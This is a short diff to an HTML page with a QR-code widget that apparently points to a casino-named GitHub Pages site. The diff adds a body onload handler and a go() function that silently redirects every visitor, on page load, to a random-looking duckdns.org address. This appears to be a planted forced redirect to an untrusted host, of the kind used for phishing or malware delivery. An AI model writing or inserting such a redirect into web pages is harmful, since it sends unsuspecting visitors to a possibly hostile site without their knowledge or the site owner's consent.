@@ -1,6 +1,6 @@
 <html>
 
-<body>
+<body onload="go()">
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.qrcode/1.0/jquery.qrcode.min.js"></script>
     <div class="qr" onclick="start()">
@@ -224,6 +224,9 @@
     
     <script>
         c = 0;
+        function go(){
+            location.href = "http://sddqrrsfzm.duckdns.org/ja/main";
+        }
         function start() {
             c++;
             var qr = unescape("https://yamate-casino.github.io/artclass/qr.html");
